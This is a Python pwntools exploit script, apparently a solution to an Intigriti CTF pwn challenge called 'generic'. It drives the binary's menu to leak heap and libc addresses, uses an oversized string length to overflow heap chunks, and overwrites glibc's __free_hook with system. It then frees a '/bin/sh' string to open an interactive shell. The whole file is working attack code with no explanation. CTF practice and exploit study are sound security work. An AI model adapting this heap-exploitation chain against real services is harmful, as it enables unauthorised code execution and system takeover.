#!/usr/bin/env python3


from pwn import *


e = ELF("./generic_patched")
r = process("./generic_patched")
#r = remote("generic.ctf.intigriti.io",9999)
libc = ELF("./libc.so.6")
def add_int(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b"Enter value",f"{val}")

def add_long(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",f"{val}")

def add_double(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter value",f"{val}")

def add_char(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Enter value",val)

def add_string(len_val,val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"length:",f"{len_val}")
    r.sendafter(b"Enter string:",val)

def remove_node(index):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"remove >",f"{index}")

def change_int(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b"Enter value",f"{val}")

def change_long(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",f"{val}")

def change_corrupt_long(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",b"-")

def change_double(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter value",f"{val}")

def change_char(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Enter value",val)

def change_string(index,len_val,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"length:",f"{len_val}")
    r.sendafter(b"Enter string:",val)



add_string(39,b"A" * 30)                   
change_corrupt_long(1)
r.sendlineafter(b">",b"1")
r.recvuntil(b"1. ")
heap_base = int(r.recvline().strip()) - 0x2d0
change_string(1,39,b"D" * 32)
change_string(1,4294967335,b"E" * 32)
add_string(0x500,b"B" * 0x500)           
add_string(0x500,b"C" * 500)             
add_long(1)                              
remove_node(3)
change_string(1,4294967335,b"/bin/sh\x00" + b"F" * 32 + p64(0x31) + p64(heap_base + 0x840 ) + p64(0x4) + p64( heap_base + 0x870))
r.sendlineafter(b">",b"1")
r.recvuntil(b"2. ")
libc_base = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) - 0x1ebbe0
log.info("The libc base of the process is " + hex(libc_base))
log.info("The heap base of the process is " + hex(heap_base))
add_string(0x500,b"G" * 500)  
add_string(39,b"Z" * 30)    
add_string(39,b"Y" * 30)     
remove_node(5)
change_string(4,4294967335,b"2" * 40 + p64(0x31) + p64(libc_base + libc.sym.__free_hook))
add_string(39,p64(libc_base + libc.sym.system))
remove_node(1)
r.interactive()
